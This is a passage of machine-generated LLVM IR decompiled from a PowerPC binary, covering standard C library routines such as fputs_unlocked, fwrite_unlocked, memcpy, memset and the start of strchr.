  uselistorder label %dec_label_pc_1000eecc, { 1, 0 }
  uselistorder label %dec_label_pc_1000eec8, { 1, 0 }
  uselistorder label %dec_label_pc_1000eeb4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ee94, { 1, 0 }
  uselistorder label %dec_label_pc_1000ee90, { 1, 0 }
  uselistorder label %dec_label_pc_1000ee74, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_1000f2fc = call i32 @__GI_strlen()
  store i32 %v0_1000f2fc, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1000f318.1059 to i32), i32* @lr, align 4
  %v4_1000f314 = inttoptr i32 %arg2 to i16*
  %v5_1000f314 = call i32 @__GI_fwrite_unlocked(i32 %arg1, i32 1, i32 %v0_1000f2fc, i16* %v4_1000f314)
  %v1_1000f31c = load i32, i32* @r27, align 4
  %v4_1000f31c = icmp eq i32 %v5_1000f314, %v1_1000f31c
  br i1 %v4_1000f31c, label %dec_label_pc_1000f324, label %dec_label_pc_1000f328

dec_label_pc_1000f324:                            ; preds = %entry
  br label %dec_label_pc_1000f328

dec_label_pc_1000f328:                            ; preds = %entry, %dec_label_pc_1000f324
  %v0_1000f328 = phi i32 [ -1, %entry ], [ %v5_1000f314, %dec_label_pc_1000f324 ]
  ret i32 %v0_1000f328

; uselistorder directives
  uselistorder label %dec_label_pc_1000f328, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  %v3_1000f358 = load i16, i16* %arg4, align 2
  %v4_1000f358 = zext i16 %v3_1000f358 to i32
  store i32 %tmp, i32* @r31, align 4
  store i32 128, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  %v1_1000f368 = call i32 @__asm_rlwinm(i32 %v4_1000f358, i32 0, i32 24, i32 25)
  store i32 %tmp, i32* @r3, align 4
  %v3_1000f370 = icmp eq i32 %v1_1000f368, 192
  br i1 %v3_1000f370, label %dec_label_pc_1000f384, label %dec_label_pc_1000f378

dec_label_pc_1000f378:                            ; preds = %entry
  store i32 268497788, i32* @lr, align 4
  %v0_1000f378 = call i32 @__stdio_trans2w_o()
  %v3_1000f37c = icmp eq i32 %v0_1000f378, 0
  br i1 %v3_1000f37c, label %dec_label_pc_1000f384, label %dec_label_pc_1000f3dc

dec_label_pc_1000f384:                            ; preds = %dec_label_pc_1000f378, %entry
  %v0_1000f384 = load i32, i32* @r29, align 4
  %v3_1000f384 = icmp eq i32 %v0_1000f384, 0
  %v0_1000f388 = load i32, i32* @r30, align 4
  %v3_1000f388 = icmp eq i32 %v0_1000f388, 0
  %brmerge = or i1 %v3_1000f384, %v3_1000f388
  br i1 %brmerge, label %dec_label_pc_1000f3dc, label %dec_label_pc_1000f394

dec_label_pc_1000f394:                            ; preds = %dec_label_pc_1000f384
  %v2_1000f39c = udiv i32 -1, %v0_1000f384
  %v0_1000f3a0 = load i32, i32* @r31, align 4
  %v3_1000f3a4 = icmp ugt i32 %v0_1000f388, %v2_1000f39c
  %v1_1000f3bc = inttoptr i32 %v0_1000f3a0 to i16*
  br i1 %v3_1000f3a4, label %dec_label_pc_1000f3bc, label %dec_label_pc_1000f3ac

dec_label_pc_1000f3ac:                            ; preds = %dec_label_pc_1000f394
  %v0_1000f398 = load i32, i32* @r28, align 4
  %v2_1000f3ac = mul i32 %v0_1000f388, %v0_1000f384
  store i32 %v2_1000f3ac, i32* %r4.global-to-local, align 4
  store i32 268497844, i32* @lr, align 4
  %v5_1000f3b0 = call i32 @__stdio_fwrite(i32 %v0_1000f398, i32 %v2_1000f3ac, i16* %v1_1000f3bc)
  %v1_1000f3b4 = load i32, i32* @r29, align 4
  %v2_1000f3b4 = udiv i32 %v5_1000f3b0, %v1_1000f3b4
  store i32 %v2_1000f3b4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000f3e0

dec_label_pc_1000f3bc:                            ; preds = %dec_label_pc_1000f394
  %v2_1000f3bc = load i16, i16* %v1_1000f3bc, align 2
  %v1_1000f3c0 = or i16 %v2_1000f3bc, 8
  store i16 %v1_1000f3c0, i16* %v1_1000f3bc, align 2
  %v0_1000f3c8 = call i32 @__errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1000f3d4 = inttoptr i32 %v0_1000f3c8 to i32*
  store i32 22, i32* %v2_1000f3d4, align 4
  %v0_1000f3e4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000f3e0

dec_label_pc_1000f3dc:                            ; preds = %dec_label_pc_1000f384, %dec_label_pc_1000f378
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000f3e0

dec_label_pc_1000f3e0:                            ; preds = %dec_label_pc_1000f3bc, %dec_label_pc_1000f3ac, %dec_label_pc_1000f3dc
  %v0_1000f3e4 = phi i32 [ %v0_1000f3e4.pre, %dec_label_pc_1000f3bc ], [ %v2_1000f3b4, %dec_label_pc_1000f3ac ], [ 0, %dec_label_pc_1000f3dc ]
  ret i32 %v0_1000f3e4

; uselistorder directives
  uselistorder i16* %v1_1000f3bc, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 1, 2, 3, 5, 6, 0, 4 }
  uselistorder i32 ()* @__stdio_trans2w_o, { 1, 0 }
  uselistorder label %dec_label_pc_1000f3e0, { 2, 0, 1 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000f3f8 = load i32, i32* @r5, align 4
  %v1_1000f3f8 = call i32 @__asm_rlwinm.(i32 %v0_1000f3f8, i32 29, i32 3, i32 31)
  store i32 %v1_1000f3f8, i32* %r9.global-to-local, align 4
  %v4_1000f3f8 = icmp eq i32 %v1_1000f3f8, 0
  store i1 false, i1* @cr0_so, align 1
  %v0_1000f3fc = load i32, i32* @r4, align 4
  %v1_1000f3fc = add i32 %v0_1000f3fc, -4
  store i32 %v1_1000f3fc, i32* %r4.global-to-local, align 4
  %v0_1000f400 = load i32, i32* @r3, align 4
  %v1_1000f400 = add i32 %v0_1000f400, -4
  store i32 %v1_1000f400, i32* @r11, align 4
  br i1 %v4_1000f3f8, label %dec_label_pc_1000f428, label %dec_label_pc_1000f408

dec_label_pc_1000f408:                            ; preds = %entry
  %v1_1000f408 = urem i32 %v1_1000f400, 4
  %v3_1000f408 = icmp eq i32 %v1_1000f408, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000f408, label %dec_label_pc_1000f410, label %dec_label_pc_1000f464

dec_label_pc_1000f410:                            ; preds = %dec_label_pc_1000f484.dec_label_pc_1000f410_crit_edge, %dec_label_pc_1000f408
  %v1_1000f41c.pre = phi i32 [ %v1_1000f400, %dec_label_pc_1000f408 ], [ %v1_1000f41c.pre.pre, %dec_label_pc_1000f484.dec_label_pc_1000f410_crit_edge ]
  %v0_1000f410 = phi i32 [ %v1_1000f3f8, %dec_label_pc_1000f408 ], [ %v1_1000f484, %dec_label_pc_1000f484.dec_label_pc_1000f410_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_1000f408 ], [ %v2_1000f46c, %dec_label_pc_1000f484.dec_label_pc_1000f410_crit_edge ]
  store i32 %v0_1000f410, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f414

dec_label_pc_1000f414:                            ; preds = %dec_label_pc_1000f414, %dec_label_pc_1000f410
  %v1_1000f41c = phi i32 [ %v2_1000f420, %dec_label_pc_1000f414 ], [ %v1_1000f41c.pre, %dec_label_pc_1000f410 ]
  %v0_1000f414 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f414 = add i32 %v0_1000f414, 4
  %v2_1000f414 = inttoptr i32 %v1_1000f414 to i32*
  %v3_1000f414 = load i32, i32* %v2_1000f414, align 4
  %v1_1000f418 = add i32 %v0_1000f414, 8
  %v2_1000f418 = inttoptr i32 %v1_1000f418 to i32*
  %v3_1000f418 = load i32, i32* %v2_1000f418, align 4
  store i32 %v3_1000f418, i32* %r9.global-to-local, align 4
  store i32 %v1_1000f418, i32* %r4.global-to-local, align 4
  %v2_1000f41c = add i32 %v1_1000f41c, 4
  %v3_1000f41c = inttoptr i32 %v2_1000f41c to i32*
  store i32 %v3_1000f414, i32* %v3_1000f41c, align 4
  %v0_1000f420 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f420 = load i32, i32* @r11, align 4
  %v2_1000f420 = add i32 %v1_1000f420, 8
  %v3_1000f420 = inttoptr i32 %v2_1000f420 to i32*
  store i32 %v0_1000f420, i32* %v3_1000f420, align 4
  store i32 %v2_1000f420, i32* @r11, align 4
  %v0_1000f424 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f424 = add i32 %v0_1000f424, -1
  store i32 %v1_1000f424, i32* %ctr.global-to-local, align 4
  %v2_1000f424 = icmp eq i32 %v1_1000f424, 0
  br i1 %v2_1000f424, label %dec_label_pc_1000f428, label %dec_label_pc_1000f414

dec_label_pc_1000f428:                            ; preds = %dec_label_pc_1000f414, %dec_label_pc_1000f484, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_1000f46c, %dec_label_pc_1000f484 ], [ %.0, %dec_label_pc_1000f414 ]
  %v1_1000f428 = urem i32 %.1, 8
  store i32 %v1_1000f428, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000f428, 4
  br i1 %tmp, label %dec_label_pc_1000f440, label %dec_label_pc_1000f434

dec_label_pc_1000f434:                            ; preds = %dec_label_pc_1000f428
  %v0_1000f434 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f434 = add i32 %v0_1000f434, 4
  %v2_1000f434 = inttoptr i32 %v1_1000f434 to i32*
  %v3_1000f434 = load i32, i32* %v2_1000f434, align 4
  store i32 %v1_1000f434, i32* %r4.global-to-local, align 4
  %v1_1000f438 = add nsw i32 %v1_1000f428, -4
  store i32 %v1_1000f438, i32* @r5, align 4
  %v1_1000f43c = load i32, i32* @r11, align 4
  %v2_1000f43c = add i32 %v1_1000f43c, 4
  %v3_1000f43c = inttoptr i32 %v2_1000f43c to i32*
  store i32 %v3_1000f434, i32* %v3_1000f43c, align 4
  store i32 %v2_1000f43c, i32* @r11, align 4
  %v0_1000f440.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000f440

dec_label_pc_1000f440:                            ; preds = %dec_label_pc_1000f428, %dec_label_pc_1000f434
  %v0_1000f440 = phi i32 [ %v1_1000f428, %dec_label_pc_1000f428 ], [ %v0_1000f440.pre, %dec_label_pc_1000f434 ]
  %v3_1000f440 = icmp eq i32 %v0_1000f440, 0
  %v0_1000f444 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f440, i32 %v0_1000f444)
  %v0_1000f448 = load i32, i32* @r5, align 4
  store i32 %v0_1000f448, i32* %ctr.global-to-local, align 4
  %v0_1000f44c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f44c = add i32 %v0_1000f44c, 3
  store i32 %v1_1000f44c, i32* %r4.global-to-local, align 4
  %v0_1000f450 = load i32, i32* @r11, align 4
  %v1_1000f450 = add i32 %v0_1000f450, 3
  store i32 %v1_1000f450, i32* %r9.global-to-local, align 4
  %v1_1000f4549 = add i32 %v0_1000f44c, 4
  %v2_1000f45410 = inttoptr i32 %v1_1000f4549 to i8*
  %v3_1000f45411 = load i8, i8* %v2_1000f45410, align 1
  store i32 %v1_1000f4549, i32* %r4.global-to-local, align 4
  %v3_1000f45813 = add i32 %v0_1000f450, 4
  %v4_1000f45814 = inttoptr i32 %v3_1000f45813 to i8*
  store i8 %v3_1000f45411, i8* %v4_1000f45814, align 1
  store i32 %v3_1000f45813, i32* %r9.global-to-local, align 4
  %v0_1000f45c15 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f45c16 = add i32 %v0_1000f45c15, -1
  store i32 %v1_1000f45c16, i32* %ctr.global-to-local, align 4
  %v2_1000f45c17 = icmp eq i32 %v1_1000f45c16, 0
  br i1 %v2_1000f45c17, label %dec_label_pc_1000f490, label %dec_label_pc_1000f454.dec_label_pc_1000f454_crit_edge

dec_label_pc_1000f454.dec_label_pc_1000f454_crit_edge: ; preds = %dec_label_pc_1000f440, %dec_label_pc_1000f454.dec_label_pc_1000f454_crit_edge
  %v3_1000f45818 = phi i32 [ %v3_1000f458, %dec_label_pc_1000f454.dec_label_pc_1000f454_crit_edge ], [ %v3_1000f45813, %dec_label_pc_1000f440 ]
  %v0_1000f454.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f454 = add i32 %v0_1000f454.pre, 1
  %v2_1000f454 = inttoptr i32 %v1_1000f454 to i8*
  %v3_1000f454 = load i8, i8* %v2_1000f454, align 1
  store i32 %v1_1000f454, i32* %r4.global-to-local, align 4
  %v3_1000f458 = add i32 %v3_1000f45818, 1
  %v4_1000f458 = inttoptr i32 %v3_1000f458 to i8*
  store i8 %v3_1000f454, i8* %v4_1000f458, align 1
  store i32 %v3_1000f458, i32* %r9.global-to-local, align 4
  %v0_1000f45c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f45c = add i32 %v0_1000f45c, -1
  store i32 %v1_1000f45c, i32* %ctr.global-to-local, align 4
  %v2_1000f45c = icmp eq i32 %v1_1000f45c, 0
  br i1 %v2_1000f45c, label %dec_label_pc_1000f490, label %dec_label_pc_1000f454.dec_label_pc_1000f454_crit_edge

dec_label_pc_1000f464:                            ; preds = %dec_label_pc_1000f408
  %v1_1000f464 = sub nsw i32 4, %v1_1000f408
  store i32 %v1_1000f464, i32* %ctr.global-to-local, align 4
  %v1_1000f46c = load i32, i32* @r5, align 4
  %v2_1000f46c = sub i32 %v1_1000f46c, %v1_1000f464
  br label %dec_label_pc_1000f470

dec_label_pc_1000f470:                            ; preds = %dec_label_pc_1000f470.dec_label_pc_1000f470_crit_edge, %dec_label_pc_1000f464
  %v2_1000f478 = phi i32 [ %v1_1000f47c, %dec_label_pc_1000f470.dec_label_pc_1000f470_crit_edge ], [ %v1_1000f400, %dec_label_pc_1000f464 ]
  %v0_1000f470 = phi i32 [ %v0_1000f470.pre, %dec_label_pc_1000f470.dec_label_pc_1000f470_crit_edge ], [ %v1_1000f3fc, %dec_label_pc_1000f464 ]
  %v1_1000f470 = add i32 %v0_1000f470, 4
  %v2_1000f470 = inttoptr i32 %v1_1000f470 to i8*
  %v3_1000f470 = load i8, i8* %v2_1000f470, align 1
  %v1_1000f474 = add i32 %v0_1000f470, 1
  store i32 %v1_1000f474, i32* %r4.global-to-local, align 4
  %v3_1000f478 = add i32 %v2_1000f478, 4
  %v4_1000f478 = inttoptr i32 %v3_1000f478 to i8*
  store i8 %v3_1000f470, i8* %v4_1000f478, align 1
  %v0_1000f47c = load i32, i32* @r11, align 4
  %v1_1000f47c = add i32 %v0_1000f47c, 1
  store i32 %v1_1000f47c, i32* @r11, align 4
  %v0_1000f480 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f480 = add i32 %v0_1000f480, -1
  store i32 %v1_1000f480, i32* %ctr.global-to-local, align 4
  %v2_1000f480 = icmp eq i32 %v1_1000f480, 0
  br i1 %v2_1000f480, label %dec_label_pc_1000f484, label %dec_label_pc_1000f470.dec_label_pc_1000f470_crit_edge

dec_label_pc_1000f470.dec_label_pc_1000f470_crit_edge: ; preds = %dec_label_pc_1000f470
  %v0_1000f470.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000f470

dec_label_pc_1000f484:                            ; preds = %dec_label_pc_1000f470
  %v1_1000f484 = call i32 @__asm_rlwinm.(i32 %v2_1000f46c, i32 29, i32 3, i32 31)
  store i32 %v1_1000f484, i32* %r9.global-to-local, align 4
  %v4_1000f484 = icmp eq i32 %v1_1000f484, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000f484, label %dec_label_pc_1000f428, label %dec_label_pc_1000f484.dec_label_pc_1000f410_crit_edge

dec_label_pc_1000f484.dec_label_pc_1000f410_crit_edge: ; preds = %dec_label_pc_1000f484
  %v1_1000f41c.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1000f410

dec_label_pc_1000f490:                            ; preds = %dec_label_pc_1000f454.dec_label_pc_1000f454_crit_edge, %dec_label_pc_1000f440
  %v0_1000f490 = load i32, i32* @r3, align 4
  ret i32 %v0_1000f490

; uselistorder directives
  uselistorder i32 %v1_1000f484, { 1, 2, 0 }
  uselistorder i32 %v1_1000f480, { 1, 0 }
  uselistorder i32 %v1_1000f47c, { 1, 0 }
  uselistorder i32 %v0_1000f470, { 1, 0 }
  uselistorder i32 %v2_1000f46c, { 2, 1, 0 }
  uselistorder i32 %v1_1000f45c, { 1, 0 }
  uselistorder i32 %v3_1000f458, { 1, 2, 0 }
  uselistorder i32 %v1_1000f428, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000f424, { 1, 0 }
  uselistorder i32 %v2_1000f420, { 1, 2, 0 }
  uselistorder i32 %v1_1000f408, { 1, 0 }
  uselistorder i32 %v1_1000f400, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f454.dec_label_pc_1000f454_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000f440, { 1, 0 }
  uselistorder label %dec_label_pc_1000f428, { 1, 0, 2 }
}

define i32 @__GI_memset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000f494 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_1000f494, i32* %r9.global-to-local, align 4
  %v4_1000f494 = icmp eq i32 %v1_1000f494, 0
  store i1 %v4_1000f494, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  %v1_1000f49c = add i32 %arg1, -4
  store i32 %v1_1000f49c, i32* %r11.global-to-local, align 4
  %v1_1000f4a0 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_1000f4a4 = call i32 @__asm_rlwimi(i32 %v1_1000f4a0, i32 16, i32 0, i32 15)
  %v2_1000f4a4 = trunc i32 %v1_1000f4a4 to i8
  %v0_1000f4a8 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000f4a8, label %dec_label_pc_1000f4cc, label %dec_label_pc_1000f4ac

dec_label_pc_1000f4ac:                            ; preds = %entry
  %v0_1000f4ac = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f4ac = urem i32 %v0_1000f4ac, 4
  %v3_1000f4ac = icmp eq i32 %v1_1000f4ac, 0
  store i1 %v3_1000f4ac, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000f4ac, label %dec_label_pc_1000f4ac.dec_label_pc_1000f4b4_crit_edge, label %dec_label_pc_1000f4fc

dec_label_pc_1000f4ac.dec_label_pc_1000f4b4_crit_edge: ; preds = %dec_label_pc_1000f4ac
  %v0_1000f4b4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f4b4

dec_label_pc_1000f4b4:                            ; preds = %dec_label_pc_1000f514.dec_label_pc_1000f4b4_crit_edge, %dec_label_pc_1000f4ac.dec_label_pc_1000f4b4_crit_edge
  %v0_1000f4b8.pre = phi i32 [ %v0_1000f4ac, %dec_label_pc_1000f4ac.dec_label_pc_1000f4b4_crit_edge ], [ %v0_1000f4b8.pre.pre, %dec_label_pc_1000f514.dec_label_pc_1000f4b4_crit_edge ]
  %v0_1000f4b4 = phi i32 [ %v0_1000f4b4.pre, %dec_label_pc_1000f4ac.dec_label_pc_1000f4b4_crit_edge ], [ %v1_1000f514, %dec_label_pc_1000f514.dec_label_pc_1000f4b4_crit_edge ]
  store i32 %v0_1000f4b4, i32* %ctr.global-to-local, align 4
  %v1_1000f4bc = sext i8 %v2_1000f4a4 to i32
  br label %dec_label_pc_1000f4b8

dec_label_pc_1000f4b8:                            ; preds = %dec_label_pc_1000f4b8, %dec_label_pc_1000f4b4
  %v0_1000f4b8 = phi i32 [ %v1_1000f4c4, %dec_label_pc_1000f4b8 ], [ %v0_1000f4b8.pre, %dec_label_pc_1000f4b4 ]
  %v1_1000f4b8 = add i32 %v0_1000f4b8, 4
  store i32 %v1_1000f4b8, i32* %r9.global-to-local, align 4
  %v4_1000f4bc = inttoptr i32 %v1_1000f4b8 to i32*
  store i32 %v1_1000f4bc, i32* %v4_1000f4bc, align 4
  %v2_1000f4c0 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000f4c0 = add i32 %v2_1000f4c0, 4
  %v4_1000f4c0 = inttoptr i32 %v3_1000f4c0 to i32*
  store i32 %v1_1000f4bc, i32* %v4_1000f4c0, align 4
  %v0_1000f4c4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f4c4 = add i32 %v0_1000f4c4, 4
  store i32 %v1_1000f4c4, i32* %r11.global-to-local, align 4
  %v0_1000f4c8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f4c8 = add i32 %v0_1000f4c8, -1
  store i32 %v1_1000f4c8, i32* %ctr.global-to-local, align 4
  %v2_1000f4c8 = icmp eq i32 %v1_1000f4c8, 0
  br i1 %v2_1000f4c8, label %dec_label_pc_1000f4cc, label %dec_label_pc_1000f4b8

dec_label_pc_1000f4cc:                            ; preds = %dec_label_pc_1000f4b8, %dec_label_pc_1000f514, %entry
  %v0_1000f4cc = load i32, i32* %r5.global-to-local, align 4
  %v1_1000f4cc = urem i32 %v0_1000f4cc, 8
  store i32 %v1_1000f4cc, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000f4cc, 4
  br i1 %tmp, label %dec_label_pc_1000f4e0, label %dec_label_pc_1000f4d8

dec_label_pc_1000f4d8:                            ; preds = %dec_label_pc_1000f4cc
  %v1_1000f4d8 = sext i8 %v2_1000f4a4 to i32
  %v2_1000f4d8 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000f4d8 = add i32 %v2_1000f4d8, 4
  %v4_1000f4d8 = inttoptr i32 %v3_1000f4d8 to i32*
  store i32 %v1_1000f4d8, i32* %v4_1000f4d8, align 4
  store i32 %v3_1000f4d8, i32* %r11.global-to-local, align 4
  %v0_1000f4dc = load i32, i32* @r5, align 4
  %v1_1000f4dc = add i32 %v0_1000f4dc, -4
  store i32 %v1_1000f4dc, i32* @r5, align 4
  br label %dec_label_pc_1000f4e0

dec_label_pc_1000f4e0:                            ; preds = %dec_label_pc_1000f4cc, %dec_label_pc_1000f4d8
  %v0_1000f4e0 = phi i32 [ %v1_1000f4cc, %dec_label_pc_1000f4cc ], [ %v1_1000f4dc, %dec_label_pc_1000f4d8 ]
  %v3_1000f4e0 = icmp eq i32 %v0_1000f4e0, 0
  %v0_1000f4e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f4e0, i32 %v0_1000f4e4)
  %v0_1000f4e8 = load i32, i32* @r5, align 4
  store i32 %v0_1000f4e8, i32* %ctr.global-to-local, align 4
  %v0_1000f4ec = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f4ec = add i32 %v0_1000f4ec, 3
  store i32 %v1_1000f4ec, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f4f0

dec_label_pc_1000f4f0:                            ; preds = %dec_label_pc_1000f4f0, %dec_label_pc_1000f4e0
  %v3_1000f4f0 = phi i32 [ %v4_1000f4f0, %dec_label_pc_1000f4f0 ], [ %v1_1000f4ec, %dec_label_pc_1000f4e0 ]
  %v4_1000f4f0 = add i32 %v3_1000f4f0, 1
  %v5_1000f4f0 = inttoptr i32 %v4_1000f4f0 to i8*
  store i8 %v2_1000f4a4, i8* %v5_1000f4f0, align 1
  store i32 %v4_1000f4f0, i32* %r9.global-to-local, align 4
  %v0_1000f4f4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f4f4 = add i32 %v0_1000f4f4, -1
  store i32 %v1_1000f4f4, i32* %ctr.global-to-local, align 4
  %v2_1000f4f4 = icmp eq i32 %v1_1000f4f4, 0
  br i1 %v2_1000f4f4, label %dec_label_pc_1000f520, label %dec_label_pc_1000f4f0

dec_label_pc_1000f4fc:                            ; preds = %dec_label_pc_1000f4ac
  %v1_1000f4fc = sub nsw i32 4, %v1_1000f4ac
  store i32 %v1_1000f4fc, i32* %ctr.global-to-local, align 4
  %v1_1000f504 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000f504 = sub i32 %v1_1000f504, %v1_1000f4fc
  store i32 %v2_1000f504, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000f508

dec_label_pc_1000f508:                            ; preds = %dec_label_pc_1000f508, %dec_label_pc_1000f4fc
  %v3_1000f508 = phi i32 [ %v1_1000f50c, %dec_label_pc_1000f508 ], [ %v0_1000f4ac, %dec_label_pc_1000f4fc ]
  %v4_1000f508 = add i32 %v3_1000f508, 4
  %v5_1000f508 = inttoptr i32 %v4_1000f508 to i8*
  store i8 %v2_1000f4a4, i8* %v5_1000f508, align 1
  %v0_1000f50c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f50c = add i32 %v0_1000f50c, 1
  store i32 %v1_1000f50c, i32* %r11.global-to-local, align 4
  %v0_1000f510 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f510 = add i32 %v0_1000f510, -1
  store i32 %v1_1000f510, i32* %ctr.global-to-local, align 4
  %v2_1000f510 = icmp eq i32 %v1_1000f510, 0
  br i1 %v2_1000f510, label %dec_label_pc_1000f514, label %dec_label_pc_1000f508

dec_label_pc_1000f514:                            ; preds = %dec_label_pc_1000f508
  %v0_1000f514 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000f514 = call i32 @__asm_rlwinm.(i32 %v0_1000f514, i32 29, i32 3, i32 31)
  store i32 %v1_1000f514, i32* %r9.global-to-local, align 4
  %v4_1000f514 = icmp eq i32 %v1_1000f514, 0
  store i1 %v4_1000f514, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000f514, label %dec_label_pc_1000f4cc, label %dec_label_pc_1000f514.dec_label_pc_1000f4b4_crit_edge

dec_label_pc_1000f514.dec_label_pc_1000f4b4_crit_edge: ; preds = %dec_label_pc_1000f514
  %v0_1000f4b8.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f4b4

dec_label_pc_1000f520:                            ; preds = %dec_label_pc_1000f4f0
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000f514, { 1, 2, 0 }
  uselistorder i32 %v1_1000f510, { 1, 0 }
  uselistorder i32 %v1_1000f50c, { 1, 0 }
  uselistorder i32 %v1_1000f4f4, { 1, 0 }
  uselistorder i32 %v4_1000f4f0, { 1, 2, 0 }
  uselistorder i32 %v1_1000f4cc, { 2, 1, 0 }
  uselistorder i32 %v1_1000f4c8, { 1, 0 }
  uselistorder i32 %v1_1000f4c4, { 1, 0 }
  uselistorder i32 %v1_1000f4ac, { 1, 0 }
  uselistorder i32 %v0_1000f4ac, { 2, 1, 0 }
  uselistorder i8 %v2_1000f4a4, { 1, 2, 3, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000f4e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f4cc, { 1, 0, 2 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000f524 = urem i32 %arg1, 256
  store i32 %v1_1000f524, i32* %r4.global-to-local, align 4
  %v0_1000f5442 = load i32, i32* @r3, align 4
  %v1_1000f5443 = urem i32 %v0_1000f5442, 4
  %v3_1000f5445 = icmp eq i32 %v1_1000f5443, 0
  br i1 %v3_1000f5445, label %dec_label_pc_1000f54c, label %dec_label_pc_1000f52c

dec_label_pc_1000f52c:                            ; preds = %entry, %dec_label_pc_1000f540
  %v1_1000f530 = phi i32 [ %v0_1000f54c.pre, %dec_label_pc_1000f540 ], [ %v1_1000f524, %entry ]
  %v0_1000f52c = phi i32 [ %v1_1000f540, %dec_label_pc_1000f540 ], [ %v0_1000f5442, %entry ]
  %v1_1000f52c = inttoptr i32 %v0_1000f52c to i8*
  %v2_1000f52c = load i8, i8* %v1_1000f52c, align 1
  %v3_1000f52c = zext i8 %v2_1000f52c to i32
  %v4_1000f530 = icmp eq i32 %v3_1000f52c, %v1_1000f530
  %v3_1000f534 = icmp eq i8 %v2_1000f52c, 0
